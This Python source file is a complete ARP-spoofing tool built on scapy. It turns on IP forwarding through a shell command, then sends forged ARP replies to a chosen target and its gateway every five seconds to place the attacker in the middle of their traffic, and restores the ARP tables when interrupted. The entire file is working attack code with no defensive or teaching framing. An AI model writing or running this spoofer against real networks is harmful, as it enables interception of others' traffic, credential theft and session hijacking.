import scapy.all as scapy
import time
import optparse as opt
import ipaddress
import logging
import subprocess

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_mac_address(ip_address):
    arp_request_packet = scapy.ARP(pdst=ip_address)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc

def get_user_input():
    parse_object = opt.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target Ip address. For example: 192.168.0.12")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway Ip address. For example: 192.168.0.1")
    (user_input,arguments) = parse_object.parse_args()
    return user_input

def arp_poisoning(target_ip,poisoned_ip):
    target_mac_address = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)

def reset_operation(target_ip, poisoned_ip):
    target_mac_address = get_mac_address(target_ip)
    gateway_mac_address = get_mac_address(poisoned_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=poisoned_ip,hwsrc=gateway_mac_address)
    scapy.send(arp_response, verbose=False,count=5)

def ip_forward():
    try:
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

        number = 0

        users_target_ip = get_user_input().target_ip
        users_gateway_ip = get_user_input().gateway_ip
        try:
            target_ip = str(ipaddress.ip_address(users_target_ip))
            try:
                gateway_ip = str(ipaddress.ip_address(users_gateway_ip))
                try:
                    while True:
                        try:
                            arp_poisoning(target_ip, gateway_ip)
                            arp_poisoning(gateway_ip, target_ip)
                            number += 2
                            print("\rSending packets " + str(number), end="")
                            time.sleep(5)
                        except IndexError:
                            print("Target not found")
                            exit()
                except KeyboardInterrupt:
                    print("\nQuit & Reset")
                    try:
                        reset_operation(target_ip, gateway_ip)
                        reset_operation(gateway_ip, target_ip)
                    except IndexError:
                        print("Target not found")
                        exit()
            except ValueError:
                if users_gateway_ip is None:
                    print("Enter Gateway Ip address")
                else:
                    print(
                        f"Error: '{users_gateway_ip}' is not a valid Gateway IP address. Please enter a valid Gateway IP address.")
        except ValueError:
            if users_target_ip is None:
                print("Enter Target Ip address")
            else:
                print(
                    f"Error: '{users_target_ip}' is not a valid Target IP address. Please enter a valid Target IP address.")


    except:
        print("Error")

ip_forward()